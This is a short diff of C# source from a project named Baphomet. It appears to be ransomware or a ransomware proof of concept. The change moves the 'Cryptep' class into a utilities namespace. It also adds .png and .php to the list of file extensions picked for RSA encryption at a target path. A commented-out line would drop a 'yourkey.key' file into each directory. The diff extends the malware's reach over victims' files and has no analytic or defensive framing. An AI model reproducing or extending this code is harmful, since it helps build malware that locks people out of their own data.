@@ -1,4 +1,3 @@
-using Baphomet.Utilities;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -6,7 +5,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace Baphomet
+namespace Baphomet.Utilities
 {
     public class Cryptep
     {
@@ -29,7 +28,7 @@ namespace Baphomet
         {
             CryptRSA cryptRSA = new CryptRSA();
 
-            var extensionCheck = new[] { ".txt",".jpg" };//Extensiones validas
+            var extensionCheck = new[] { ".txt",".jpg",".png",".php" };//Extensiones validas
             cryptRSA.EncryptText(targetPath, key);
 
            // File.WriteAllText(targetPath + "\\yourkey.key", encryptedKey);//escribo la llave en cada uno de los directorios
